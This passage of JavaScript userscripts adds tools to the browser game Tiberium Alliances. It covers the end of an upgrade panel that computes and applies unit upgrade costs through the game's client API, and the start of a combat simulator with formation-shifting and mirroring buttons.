                                this.lblCurrentPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                                this.lblCurrentPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                                this.lblCurrentPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                                if (Pow === 0) this.lblCurrentPow.exclude(); 
                                else this.lblCurrentPow.show(); 
                            } else { 
                                this.lblCurrentTib.setLabel("-"); 
                                this.lblCurrentTib.resetToolTipText(); 
                                this.lblCurrentTib.resetToolTipIcon(); 
                                this.lblCurrentTib.show(); 
                                this.lblCurrentCry.setLabel("-"); 
                                this.lblCurrentCry.resetToolTipText(); 
                                this.lblCurrentCry.resetToolTipIcon(); 
                                this.lblCurrentCry.show(); 
                                this.lblCurrentPow.setLabel("-"); 
                                this.lblCurrentPow.resetToolTipText(); 
                                this.lblCurrentPow.resetToolTipIcon(); 
                                this.lblCurrentPow.show(); 
                            } 
                        } else { 
                            this.lblCurrentTib.setLabel("-"); 
                            this.lblCurrentTib.resetToolTipText(); 
                            this.lblCurrentTib.resetToolTipIcon(); 
                            this.lblCurrentTib.show(); 
                            this.lblCurrentCry.setLabel("-"); 
                            this.lblCurrentCry.resetToolTipText(); 
                            this.lblCurrentCry.resetToolTipIcon(); 
                            this.lblCurrentCry.show(); 
                            this.lblCurrentPow.setLabel("-"); 
                            this.lblCurrentPow.resetToolTipText(); 
                            this.lblCurrentPow.resetToolTipIcon(); 
                            this.lblCurrentPow.show(); 
                        } 
                    }, 
                    upgradeCurrent: function() { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.DefenseUnitType) 
                                ClientLib.API.Defense.GetInstance().UpgradeUnitToLevel(obj.get_UnitDetails(), newLevel); 
                                this.onSelectionChange(null, this.Current); 
                        } 
                        this.txtCurrentNewLevel.setValue(""); 
                    }, 
                    onAllNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        var costs = ClientLib.API.Defense.GetInstance().GetUpgradeCostsForAllUnitsToLevel(newLevel); 
                        if (newLevel > 0 && costs !== null) { 
                        debug = costs; 
                            var Tib = 0; 
                            var Cry = 0; 
                            var Pow = 0; 
                            for (var i = 0; i < costs.length; i++) { 
                                var uCosts = costs[i]; 
                                var cType = parseInt(uCosts.Type, 10); 
                                switch (cType) { 
                                case ClientLib.Base.EResourceType.Tiberium: 
                                    Tib += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.Crystal: 
                                    Cry += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.Power: 
                                    Pow += uCosts.Count; 
                                    break; 
                                } 
                            } 
                            this.lblAllTib.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Tib)); 
                            this.lblAllTib.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Tib)); 
                            this.lblAllTib.setToolTipIcon("webfrontend/ui/common/icn_res_tiberium.png"); 
                            if (Tib === 0) this.lblAllTib.exclude(); 
                            else this.lblAllTib.show(); 
                            this.lblAllCry.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Cry)); 
                            this.lblAllCry.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Cry)); 
                            this.lblAllCry.setToolTipIcon("webfrontend/ui/common/icn_res_chrystal.png"); 
                            if (Cry === 0) this.lblAllCry.exclude(); 
                            else this.lblAllCry.show(); 
                            this.lblAllPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                            this.lblAllPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                            this.lblAllPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                            if (Pow === 0) this.lblAllPow.exclude(); 
                            else this.lblAllPow.show(); 
                        } else { 
                            this.lblAllTib.setLabel("-"); 
                            this.lblAllTib.resetToolTipText(); 
                            this.lblAllTib.resetToolTipIcon(); 
                            this.lblAllTib.show(); 
                            this.lblAllCry.setLabel("-"); 
                            this.lblAllCry.resetToolTipText(); 
                            this.lblAllCry.resetToolTipIcon(); 
                            this.lblAllCry.show(); 
                            this.lblAllPow.setLabel("-"); 
                            this.lblAllPow.resetToolTipText(); 
                            this.lblAllPow.resetToolTipIcon(); 
                            this.lblAllPow.show(); 
                        } 
                    }, 
                    upgradeAll: function() { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        if (newLevel > 0) ClientLib.API.Defense.GetInstance().UpgradeAllUnitsToLevel(newLevel); 
                        this.txtAllNewLevel.setValue(""); 
                    } 
                } 
            }); 
            qx.Class.define("Upgrade.Army", { 
                type: "singleton", 
                extend: qx.ui.window.Window, 
                construct: function () { 
                    try { 
                        var qxApp = qx.core.Init.getApplication(); 
                        this.base(arguments); 
                        this.set({ 
                            layout: new qx.ui.layout.VBox().set({ spacing: 0 }), 
                            caption: qxApp.tr("tnf:toggle upgrade mode") + ": " + qxApp.tr("tnf:offense"), 
                            icon: "FactionUI/icons/icon_army_points.png", 
                            contentPadding: 5, 
                            contentPaddingTop: 0, 
                            allowMaximize: false, 
                            showMaximize: false, 
                            allowMinimize: false, 
                            showMinimize: false, 
                            resizable: false 
                        }); 
                        this.getChildControl("icon").set({ width : 18, height : 18, scale : true, alignY : "middle" }); 
 
                        var cntCurrent = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntCurrent.add(new qx.ui.basic.Label("Upgrade current army unit").set({ alignX: "center", font: "font_size_14_bold" })); 
                        this.lblCurrent = new qx.ui.basic.Label("Selected army unit: -"); 
                        cntCurrent.add(this.lblCurrent); 
                        var cntCurrentHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtCurrentNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtCurrentNewLevel.addListener("input", this.onCurrentNewLevelInput, this); 
                        cntCurrentHBox.add(this.txtCurrentNewLevel); 
                        var btnCurrent = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnCurrent.addListener("execute", this.upgradeCurrent, this); 
                        cntCurrentHBox.add(btnCurrent); 
                        cntCurrent.add(cntCurrentHBox); 
                        var cntCurrentRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntCurrentRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntCurrentRes.add(this.lblCurrentCry = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_chrystal.png")); 
                        this.lblCurrentCry.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrentRes.add(this.lblCurrentPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblCurrentPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntCurrent.add(cntCurrentRes); 
                        this.add(cntCurrent); 
 
                        var cntAll = new qx.ui.container.Composite(new qx.ui.layout.VBox(5)).set({ padding: 5, decorator: "pane-light-opaque" }); 
                        cntAll.add(new qx.ui.basic.Label("Upgrade all army units").set({ alignX: "center", font: "font_size_14_bold" })); 
                        var cntAllHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllHBox.add(new qx.ui.basic.Label("New Level:").set({ alignY: "middle" })); 
                        this.txtAllNewLevel = new qx.ui.form.TextField().set({ width: 100 }); 
                        this.txtAllNewLevel.addListener("input", this.onAllNewLevelInput, this); 
                        cntAllHBox.add(this.txtAllNewLevel); 
                        var btnAll = new qx.ui.form.Button(qxApp.tr("tnf:toggle upgrade mode"), "FactionUI/icons/icon_building_detail_upgrade.png"); 
                        btnAll.addListener("execute", this.upgradeAll, this); 
                        cntAllHBox.add(btnAll); 
                        cntAll.add(cntAllHBox); 
                        var cntAllRes = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)); 
                        cntAllRes.add(new qx.ui.basic.Label(qxApp.tr("tnf:requires:"))); 
                        cntAllRes.add(this.lblAllCry = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_chrystal.png")); 
                        this.lblAllCry.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAllRes.add(this.lblAllPow = new qx.ui.basic.Atom("-", "webfrontend/ui/common/icn_res_power.png")); 
                        this.lblAllPow.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        cntAll.add(cntAllRes); 
                        this.add(cntAll); 
 
                        this.addListener("close", this.onClose, this); 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "SelectionChange", ClientLib.Vis.SelectionChange, this, this.onSelectionChange); 
                    } catch (e) { 
                        console.log("Error setting up Upgrade.Army Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
                destruct: function () {}, 
                members: { 
                    lblCurrent: null, 
                    lblCurrentCry: null, 
                    lblCurrentPow: null, 
                    txtCurrentNewLevel: null, 
                    Current: null, 
                    lblAllCry: null, 
                    lblAllPow: null, 
                    txtAllNewLevel: null, 
                    onClose: function () { 
                            this.lblCurrent.setValue("Selected army unit: -"); 
                            this.txtCurrentNewLevel.resetValue(); 
                            this.Current = null; 
                            this.txtAllNewLevel.resetValue(); 
                    }, 
                    onSelectionChange: function(oldObj, newObj) { 
                        if (newObj != null && newObj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.ArmyUnitType) { 
                            this.Current = newObj; 
                            var name = newObj.get_UnitName(); 
                            var level = newObj.get_UnitLevel(); 
                            this.lblCurrent.setValue("Selected army unit: " + name + " (" + level.toString() + ")"); 
                            this.onCurrentNewLevelInput(); 
                        } 
                    }, 
                    onCurrentNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.ArmyUnitType && newLevel > obj.get_UnitLevel()) { 
                                var costs = ClientLib.API.Army.GetInstance().GetUpgradeCostsForUnitToLevel(obj.get_UnitDetails(), newLevel); 
                                var Cry = 0; 
                                var Pow = 0; 
                                for (var i = 0; i < costs.length; i++) { 
                                    var uCosts = costs[i]; 
                                    var cType = parseInt(uCosts.Type, 10); 
                                    switch (cType) { 
                                    case ClientLib.Base.EResourceType.Crystal: 
                                        Cry += uCosts.Count; 
                                        break; 
                                    case ClientLib.Base.EResourceType.Power: 
                                        Pow += uCosts.Count; 
                                        break; 
                                    } 
                                } 
                                this.lblCurrentCry.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Cry)); 
                                this.lblCurrentCry.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Cry)); 
                                this.lblCurrentCry.setToolTipIcon("webfrontend/ui/common/icn_res_chrystal.png"); 
                                if (Cry === 0) this.lblCurrentCry.exclude(); 
                                else this.lblCurrentCry.show(); 
                                this.lblCurrentPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                                this.lblCurrentPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                                this.lblCurrentPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                                if (Pow === 0) this.lblCurrentPow.exclude(); 
                                else this.lblCurrentPow.show(); 
                            } else { 
                                this.lblCurrentCry.setLabel("-"); 
                                this.lblCurrentCry.resetToolTipText(); 
                                this.lblCurrentCry.resetToolTipIcon(); 
                                this.lblCurrentCry.show(); 
                                this.lblCurrentPow.setLabel("-"); 
                                this.lblCurrentPow.resetToolTipText(); 
                                this.lblCurrentPow.resetToolTipIcon(); 
                                this.lblCurrentPow.show(); 
                            } 
                        } else { 
                            this.lblCurrentCry.setLabel("-"); 
                            this.lblCurrentCry.resetToolTipText(); 
                            this.lblCurrentCry.resetToolTipIcon(); 
                            this.lblCurrentCry.show(); 
                            this.lblCurrentPow.setLabel("-"); 
                            this.lblCurrentPow.resetToolTipText(); 
                            this.lblCurrentPow.resetToolTipIcon(); 
                            this.lblCurrentPow.show(); 
                        } 
                    }, 
                    upgradeCurrent: function() { 
                        var newLevel = parseInt(this.txtCurrentNewLevel.getValue(), 10); 
                        if (newLevel > 0) { 
                            var obj = this.Current; 
                            if (obj !== null && obj.get_VisObjectType() == ClientLib.Vis.VisObject.EObjectType.ArmyUnitType) 
                                ClientLib.API.Army.GetInstance().UpgradeUnitToLevel(obj.get_UnitDetails(), newLevel); 
                                this.onSelectionChange(null, this.Current); 
                        } 
                        this.txtCurrentNewLevel.setValue(""); 
                    }, 
                    onAllNewLevelInput: function () { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        var costs = ClientLib.API.Army.GetInstance().GetUpgradeCostsForAllUnitsToLevel(newLevel); 
                        if (newLevel > 0 && costs !== null) { 
                            var Cry = 0; 
                            var Pow = 0; 
                            for (var i = 0; i < costs.length; i++) { 
                                var uCosts = costs[i]; 
                                var cType = parseInt(uCosts.Type, 10); 
                                switch (cType) { 
                                case ClientLib.Base.EResourceType.Crystal: 
                                    Cry += uCosts.Count; 
                                    break; 
                                case ClientLib.Base.EResourceType.Power: 
                                    Pow += uCosts.Count; 
                                    break; 
                                } 
                            } 
                            this.lblAllCry.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Cry)); 
                            this.lblAllCry.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Cry)); 
                            this.lblAllCry.setToolTipIcon("webfrontend/ui/common/icn_res_chrystal.png"); 
                            if (Cry === 0) this.lblAllCry.exclude(); 
                            else this.lblAllCry.show(); 
                            this.lblAllPow.setLabel(phe.cnc.gui.util.Numbers.formatNumbersCompact(Pow)); 
                            this.lblAllPow.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(Pow)); 
                            this.lblAllPow.setToolTipIcon("webfrontend/ui/common/icn_res_power.png"); 
                            if (Pow === 0) this.lblAllPow.exclude(); 
                            else this.lblAllPow.show(); 
                        } else { 
                            this.lblAllCry.setLabel("-"); 
                            this.lblAllCry.resetToolTipText(); 
                            this.lblAllCry.resetToolTipIcon(); 
                            this.lblAllCry.show(); 
                            this.lblAllPow.setLabel("-"); 
                            this.lblAllPow.resetToolTipText(); 
                            this.lblAllPow.resetToolTipIcon(); 
                            this.lblAllPow.show(); 
                        } 
                    }, 
                    upgradeAll: function() { 
                        var newLevel = parseInt(this.txtAllNewLevel.getValue(), 10); 
                        if (newLevel > 0) ClientLib.API.Army.GetInstance().UpgradeAllUnitsToLevel(newLevel); 
                        this.txtAllNewLevel.setValue(""); 
                    } 
                } 
            }); 
        } 
        function waitForGame() { 
            try { 
                if (typeof qx != 'undefined' && typeof qx.core != 'undfined' && typeof qx.core.Init != 'undefined') { 
                    var app = qx.core.Init.getApplication(); 
                    if (app.initDone == true) { 
                        try { 
                            console.log("WarChiefs - Tiberium Alliances Upgrade Base/Defense/Army: Loading"); 
                            createClasses(); 
                            Upgrade.getInstance(); 
                            Upgrade.Base.getInstance(); 
                            Upgrade.Defense.getInstance(); 
                            Upgrade.Army.getInstance(); 
                            console.log("WarChiefs - Tiberium Alliances Upgrade Base/Defense/Army: Loaded"); 
                        } catch (e) { 
                            console.log(e); 
                        } 
                    } else { 
                        window.setTimeout(waitForGame, 1000); 
                    } 
                } else { 
                    window.setTimeout(waitForGame, 1000); 
                } 
            } catch (e) { 
                console.log(e); 
            } 
        } 
        window.setTimeout(waitForGame, 1000); 
    }; 
 
    var script = document.createElement("script"); 
    var txt = injectFunction.toString(); 
    script.innerHTML = "(" + txt + ")();"; 
    script.type = "text/javascript"; 
 
    document.getElementsByTagName("head")[0].appendChild(script); 
})();




// ==UserScript== 
// @name            WarChiefs - Tiberium Alliances Combat Simulator 
// @description     Combat Simulator used to plan and strategize attack before going into battle. 
// @author          Eistee 
// @version         13.05.18.1 
// @namespace       http*://*.alliances.commandandconquer.com/* 
// @include         http*://*.alliances.commandandconquer.com/* 
// @require         http://usocheckup.redirectme.net/165888.js 
// @icon            http://s3.amazonaws.com/uso_ss/icon/165888/large.png 
// @updateURL       https://userscripts.org/scripts/source/165888.meta.js 
// @downloadURL     https://userscripts.org/scripts/source/165888.user.js 
// @grant           GM_getValue 
// @grant           GM_log 
// @grant           GM_openInTab 
// @grant           GM_registerMenuCommand 
// @grant           GM_setValue 
// @grant           GM_xmlhttpRequest 
// ==/UserScript== 
/** 
 *  License: CC-BY-NC-SA 3.0 
 * 
 *  Although I am the author of this script, I want to also give credit to other authors who's methods and ideas are or might appear in this script. 
 *  Credits: Topper42, Eferz98, PythEch, MrHIDEn, Panavia2, Deyhak, CodeEcho, Matthias Fuchs, Enceladus, TheLuminary, Da Xue, Quor, WildKatana, Peluski17, Elda1990, TheStriker, JDuarteDJ, null 
 */ 
(function () { 
    var injectFunction = function () { 
        function createClasses() { 
            qx.Class.define("Simulator", { 
                type: "singleton", 
                extend: qx.core.Object, 
 
                construct: function () { 
                    try { 
                        this.armyBar = qx.core.Init.getApplication().getArmySetupAttackBar(); 
                        this.playArea = qx.core.Init.getApplication().getMainOverlay(); 
                        this.replayBar = qx.core.Init.getApplication().getReportReplayOverlay(); 
                        this.isSimButtonDisabled = false; 
                        this.armyTempFormations = []; 
                        this.armyTempIdx = 0; 
                        this.isSimulation = false; 
                        this.hideArmyTooltips(); 
 
                        /** 
                         *   Setup Images 
                         */ 
 
                        var i, img = { 
                            Arrows: { 
                                Up: "webfrontend/theme/arrows/up.png", 
                                Down: "webfrontend/theme/arrows/down.png", 
                                Left: "webfrontend/theme/arrows/left.png", 
                                Right: "webfrontend/theme/arrows/right.png" 
                            }, 
                            Flip: { 
                                H: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOvgAADr4B6kKxwAAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAACo0lEQVQ4T2PABkJq+rjmH7nUdPrV119nXn/9s+7S/R1NCzc4rTx1a8ay41c7WuYsl5WRkWGEKicM4honSux7+Pb42Tdf/4LwwacfP7Wv3pOz8sydVavO3lk5f9cx15jCGhaocsJgys7jAUeffXiGZODn1lW7Claeub16xelb64C4Ma+lnx+qHD/wySpjXnnqeifQq79RDFy5qxBq4PqVp25Ombxmhw4QQHXhAdH1fWL77r++DDToD04Dz9xeteDAuajc1gn4ve0UkciU3zvT4vTrb79ghmEzEOTtNefvL8pomyrExsYG1Y0FxNT18my4dH8KKGYJGLgeGDkrJqzeoR9ZWMMM1Y4Jercctjr46N1NZMNwGQhy5YpTN/PzWvu5oNpRgUdGGdOc/WfST736guJdPAauX3HiekfH4vXyUCNQQVhtn8D2W8+2nEGKDEIGgrw9a+cxeyUlJdRE7pldxZjcOlXj6LOPj9ENw2cgkL9m2dHL2TGljZxQoyAgrKaHdfmZWxVA734jxUAQXnXm9tS6yXMlTG2doKYBQWrrZIHNVx4sBWrG8C4I4zNw5enbi+ftPuGSVNGMiO2edXstjz3/9BabYSBMwMC1y09cr2pbvFEIbJh/RinrlI1744CRAc9q6BifgSC8+tzdpT1rdmuAE3l80yTZ/UglCzZMyECQ+MID58NiyprYGGbuO5t1/MWn99gMgmFCBoLwytO3Wir6ZggzLDpycQJyyYINH3r66WP7mj25wPDCZ+DsSRv2WTAsPHCmChgh7068/PwTGz4OlFtz+npX7/p9LstP3WwA4hZseMXp2w3Td56wYyho6lSdsfNY6YzdJydM330CBYPEQHIVnROVIzMLOIvb+oVq+meIVPVOQ8EgsYqeqUJJpfWcAKWymA2EsiGlAAAAAElFTkSuQmCC", 
                                V: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOvgAADr4B6kKxwAAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAAClklEQVQ4T2MgB/iVd7CH1/SI9G3YF7D4+JUlR59/+nH61dff8w6cnQBVgh+EN01hjGqZxpY9eYlI39YjNvMOni888Ojd0aNP3z8+8/rr77Nvvv498+brn/n7T0+HasEOIlpnMIc1TBIJq+vX3HjtSd/ma4/WnHj59TtQM9gQZAwycO7ekzOhWhHAo6CRKaymh6d69krVWfvOpO19+O700WcfYS75g24QDGMYCPQWS1TzFKmktmkmO26/XLHv3sujwHD5CVSM0xBkDDcwqLJLcMHxa/FLT17rOPz04/PTb779wqaBEIYbOHv/2ZxjLz6/BglgU0gshhu44MDZaUABigwDYbCB+07NZJi29WDFvrsvLu+78/waDnwdixgmBpoxbduhMgav6ETZyNxSm+j8creoPPJwdH4FkC6z9o1NlWaYsnGf0ZpzdyeuOnt3GSUYZMZUoFkMk7ceDV555s6KFadvrQPi9eRioBmrpu44EcLQvHijweJDFzJWnrrRu/LM7VVASbIMBupdPWX78TAGt8Bw1oSsfL6qCbMUp2855Lvk+LXGFaduTgcpACpci64RF4YbCALe3t6MLi4uTC6BEZwhqXnC3Us3ms7acSxi+YlrLaDwgRqO1SAYRjEQGYAMB2JmN08v9vCMAuGWafPVFu4/E7H8+NWaVWduz11x+vYakgyEAaChDEBXM3r5+rOGJmVwlzZ1Svav2m656NDFghWnbk0FGrAEaBAoSMBhTtBAdAByuZOrO4t7eDxfWlWz7IztR70WHDiXA3T1jFVn76wE4hVTtx8PhionDoBc7eDgwODq4ckcFJPEHp9TJNA0e5n6tPU77ZcfvZLaNnupClQpeQDkaktLS2Y3Hz9Ov8h4XltnV3YAMTRvewY5T1wAAAAASUVORK5CYII=" 
                            }, 
                            DisableUnit: "FactionUI/icons/icon_disable_unit.png", 
                            Undo: "FactionUI/icons/icon_refresh_funds.png" 
                        }; 
 
                         /** 
                         *   Setup Buttons 
                         */ 
 
                        //Simulation Button// 
                        this.simBtn = new qx.ui.form.Button("Simulate").set({toolTipText: "Opens Simulation Screen.", width: 60, height: 28, alignY: "middle", appearance: "button-text-small"}); 
                        this.simBtn.addListener("click", function () { this.__openSimulatorWindow(); }, this); 
                        this.armyBar.add(this.simBtn, {left: null, right: 58, bottom: 119}); 
 
                        //Simulator Stats Button// 
                        this.statBtn = new qx.ui.form.Button("Stats").set({toolTipText: "Opens Simulator Stats Window", width: 60, height: 28, alignY: "middle", appearance: "button-text-small"}); 
                        this.statBtn.addListener("click", function () { this.__openStatWindow(); }, this); 
                        this.armyBar.add(this.statBtn, {left: null, right: 58, bottom: 81}); 
 
                        //Simulator Options Button// 
                        this.optionBtn = new qx.ui.form.Button("Options").set({toolTipText: "Opens Simulator Options", width: 60, height: 28, alignY: "middle", appearance: "button-text-small"}); 
                        this.optionBtn.addListener("click", function () { this.__openOptionWindow(); }, this); 
                        this.armyBar.add(this.optionBtn, {left: null, right: 58, bottom: 43}); 
 
                        //Simulator Layout Button// 
                        this.layoutBtn = new qx.ui.form.Button("Layout").set({toolTipText: "Save/Load/Delete Unit Formations for current city", width: 60, height: 28, alignY: "middle", appearance: "button-text-small"}); 
                        this.layoutBtn.addListener("click", function () { this.__openLayoutWindow(); }, this); 
                        this.armyBar.add(this.layoutBtn, {left: null, right: 58, bottom: 6}); 
 
                        //Simulator Unlock Combat Button// 
                        this.unlockCmtBtn = new qx.ui.form.Button("Unlock").set({toolTipText: "Unlock Combat Button", width: 44, height: 44, opacity: 0.4, padding : 0, alignY: "middle", appearance: "button-text-small"}); 
                        this.unlockCmtBtn.addListener("click", function () { this.timeoutCmtBtn(); }, this); 
                        this.armyBar.add(this.unlockCmtBtn, {left: null, right: 10, bottom: 8}); 
 
                        //Simulator Unlock Repair Time Button// 
                        this.unlockRTBtn = new qx.ui.form.Button("Unlock").set({toolTipText: "Unlock Repair Button", width: 44, height: 44, opacity: 0.4, padding : 0, alignY: "middle", appearance: "button-text-small"}); 
                        this.unlockRTBtn.addListener("click", function () { this.timeoutRTBtn(); }, this); 
                        this.armyBar.add(this.unlockRTBtn, {left: null, right: 10, bottom: 100}); 
 
                        //Formation Shift Buttons// 
                        this.shiftUpBtn = new qx.ui.form.Button("", img.Arrows.Up).set({toolTipText: "Shifts units one space up", width: 30, height: 20, alignY: "middle", appearance: "button-text-small", gap: 0, iconPosition: "top", show: "icon"}); 
                        this.shiftUpBtn.addListener("click", function () { this.shiftFormation("u"); }, this); 
                        this.shiftUpBtn.hide(); 
                        this.playArea.add(this.shiftUpBtn, {left: null, right: 75, bottom: 113}); 
 
                        this.shiftDownBtn = new qx.ui.form.Button("", img.Arrows.Down).set({toolTipText: "Shifts units one space down", width: 30, height: 20, alignY: "middle", appearance: "button-text-small", gap: 0, iconPosition: "top", show: "icon"});  
                        this.shiftDownBtn.addListener("click", function () { this.shiftFormation("d"); }, this); 
                        this.shiftDownBtn.hide(); 
                        this.playArea.add(this.shiftDownBtn, {left: null, right: 75, bottom: 73}); 
 
                        this.shiftLeftBtn = new qx.ui.form.Button("", img.Arrows.Left).set({toolTipText: "Shifts units one space left", width: 30, height: 20, alignY: "middle", appearance: "button-text-small", gap: 0, iconPosition: "top", show: "icon"});  
                        this.shiftLeftBtn.addListener("click", function () { this.shiftFormation("l"); }, this); 
                        this.shiftLeftBtn.hide(); 
                        this.playArea.add(this.shiftLeftBtn, {left: null, right: 95, bottom: 93}); 
 
                        this.shiftRightBtn = new qx.ui.form.Button("", img.Arrows.Right).set({toolTipText: "Shifts units one space right", width: 30, height: 20, alignY: "middle", appearance: "button-text-small", gap: 0, iconPosition: "top", show: "icon"}); 
                        this.shiftRightBtn.addListener("click", function () { this.shiftFormation("r"); }, this); 
                        this.shiftRightBtn.hide(); 
                        this.playArea.add(this.shiftRightBtn, {left: null, right: 55, bottom: 93}); 
 
                        for (i = 0; i < ClientLib.Base.Util.get_ArmyMaxSlotCountY(); i++) { 
                            var btnMirrorH = new qx.ui.form.Button(i, img.Flip.H).set({toolTipText: "Mirrors current row", width: 19, maxHeight: 25, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints"}); 
                            btnMirrorH.addListener("click", function (e) { this.mirrorFormation("h", parseInt(e.getTarget().getLabel(), 10)); }, this); 
                            btnMirrorH.getChildControl("icon").set({width: 16, height: 16, scale: true}); 
                            var shiftLeftBtn = new qx.ui.form.Button(i, img.Arrows.Left).set({toolTipText: "Shifts units one space left", width: 20, maxHeight: 25, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints"}); 
                            shiftLeftBtn.addListener("click", function (e) { this.shiftFormation("l", parseInt(e.getTarget().getLabel(), 10)); }, this); 
                            var shiftRightBtn = new qx.ui.form.Button(i, img.Arrows.Right).set({toolTipText: "Shifts units one space right", width: 20, maxHeight: 25, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints"}); 
                            shiftRightBtn.addListener("click", function (e) { this.shiftFormation("r", parseInt(e.getTarget().getLabel(), 10)); }, this); 
 
                            var cntWave = this.armyBar.getMainContainer().getChildren()[(i+4)]; 
                            cntWave.removeAll(); 
                            cntWave.setLayout(new qx.ui.layout.HBox()); 
                            cntWave.add(btnMirrorH); 
                            cntWave.add(new qx.ui.core.Spacer(), {flex: 1}); 
                            cntWave.add(shiftLeftBtn); 
                            cntWave.add(shiftRightBtn); 
                        } 
                        var formation = this.armyBar.getMainContainer().getChildren()[1].getChildren()[0]; 
                        var btnHBox = new qx.ui.container.Composite(new qx.ui.layout.HBox()); 
                        var btnHBoxouter = new qx.ui.container.Composite(new qx.ui.layout.HBox()); 
                        btnHBoxouter.add(new qx.ui.core.Spacer(), {flex: 1}); 
                        btnHBoxouter.add(btnHBox); 
                        btnHBoxouter.add(new qx.ui.core.Spacer(), {flex: 1}); 
                        this.armyBar.add(btnHBoxouter, { left : 16, top : 7, right : 0}); 
                        formation.bind("changeWidth", btnHBox, "width"); 
 
                        for (i = 0; i < ClientLib.Base.Util.get_ArmyMaxSlotCountX(); i++) { 
                            var btnMirrorV = new qx.ui.form.Button(i, img.Flip.V).set({toolTipText: "Mirrors current column", width: 25, maxHeight: 19, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints", opacity: 0.3}); 
                            btnMirrorV.addListener("click", function (e) { this.mirrorFormation("v", parseInt(e.getTarget().getLabel(), 10)); }, this); 
                            btnMirrorV.addListener("mouseover", function (e) { e.getTarget().set({opacity: 1.0}); }, this); 
                            btnMirrorV.addListener("mouseout", function (e) { e.getTarget().set({opacity: 0.3}); }, this); 
                            btnMirrorV.getChildControl("icon").set({width: 14, height: 14, scale: true}); 
                            var btnShiftUp = new qx.ui.form.Button(i, img.Arrows.Up).set({toolTipText: "Shifts units one space up", width: 25, maxHeight: 19, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints", opacity: 0.3}); 
                            btnShiftUp.addListener("click", function (e) { this.shiftFormation("u", parseInt(e.getTarget().getLabel(), 10)); }, this); 
                            btnShiftUp.addListener("mouseover", function (e) { e.getTarget().set({opacity: 1.0}); }, this); 
                            btnShiftUp.addListener("mouseout", function (e) { e.getTarget().set({opacity: 0.3}); }, this); 
                            var btnShiftDown = new qx.ui.form.Button(i, img.Arrows.Down).set({toolTipText: "Shifts units one space down", width: 25, maxHeight: 19, alignY: "middle", show: "icon", iconPosition: "top", appearance: "button-addpoints", opacity: 0.3}); 
                            btnShiftDown.addListener("click", function (e) { this.shiftFormation("d", parseInt(e.getTarget().getLabel(), 10)); }, this); 
